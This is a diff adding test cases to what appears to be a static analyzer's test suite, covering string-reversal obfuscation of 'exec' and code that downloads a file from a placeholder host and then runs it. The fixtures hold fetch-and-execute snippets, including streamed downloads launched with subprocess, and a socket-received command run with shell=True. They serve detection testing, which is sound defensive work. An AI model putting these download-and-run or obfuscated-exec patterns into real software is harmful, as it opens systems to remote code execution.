@@ -137,6 +137,16 @@ class TestConstantFolding:
         not knowable, which is a different finding rather than a worse guess."""
         assert PyastHelpers.folded('"ex" + suffix') is None
 
+    def test_a_literal_stored_backwards(self) -> None:
+        assert PyastHelpers.folded('"dilavni.h//:sptth"[::-1]') == "https://h.invalid"
+        assert PyastHelpers.folded('"".join(reversed("cexe"))') == "exec"
+        assert Capability.EXECUTE in PyastHelpers.capabilities('__builtins__["cexe"[::-1]]("pass")')
+
+    def test_other_slices_and_runtime_values_are_not_reversed(self) -> None:
+        assert PyastHelpers.folded('"abcdef"[::2]') is None
+        assert PyastHelpers.folded('"abcdef"[1:]') is None
+        assert PyastHelpers.folded("name[::-1]") is None
+
 
 class TestReflectiveResolution:
     def test_getattr_with_a_constant_name(self) -> None:
@@ -399,6 +409,15 @@ class TestDownloadedThenRun:
             "helper.write_bytes(r.content)\nsubprocess.run([sys.executable, str(helper)])\n",
             'import urllib.request\nbody = urllib.request.urlopen("https://h.invalid").read().decode()\nexec(body)\n',
             "import subprocess\ncmd = conn.recv(1024).decode()\nsubprocess.run(cmd, shell=True)\n",
+            # streamed to disk a chunk at a time, then started
+            'import os, requests, subprocess\nF = "/tmp/u.bin"\ndef go():\n'
+            '    r = requests.get("https://h.invalid", stream=True)\n    with open(F, "wb") as f:\n'
+            "        for chunk in r.iter_content(chunk_size=8192):\n            f.write(chunk)\n"
+            "    if os.path.exists(F):\n        subprocess.Popen([F])\n",
+            # a loop over a loop's pieces is still the download
+            'import subprocess, urllib.request\nwith urllib.request.urlopen("https://h.invalid") as r, '
+            'open("/tmp/v.sh", "w") as o:\n    for block in r:\n        for line in block.splitlines():\n'
+            '            o.write(line)\nsubprocess.run(["sh", "/tmp/v.sh"])\n',
         ],
     )
     def test_running_the_downloaded_file_is_fetch_exec(self, source) -> None:
@@ -415,6 +434,10 @@ class TestDownloadedThenRun:
             'import requests, subprocess\nsha = requests.get("https://h.invalid").json()["sha"]\n'
             'subprocess.run(f"git checkout {sha}", shell=True)\n',
             "import subprocess\njob = pipe.recv()\nsubprocess.run(job, shell=True)\n",
+            # a dataset streamed to disk, and a different program started on other input
+            'import requests, subprocess\nr = requests.get("https://h.invalid/d.csv", stream=True)\n'
+            'with open("d.csv", "wb") as f:\n    for chunk in r.iter_content(65536):\n        f.write(chunk)\n'
+            'subprocess.run(["wc", "-l", "other.csv"])\n',
         ],
     )
     def test_naming_a_download_without_running_it_is_not(self, source) -> None:
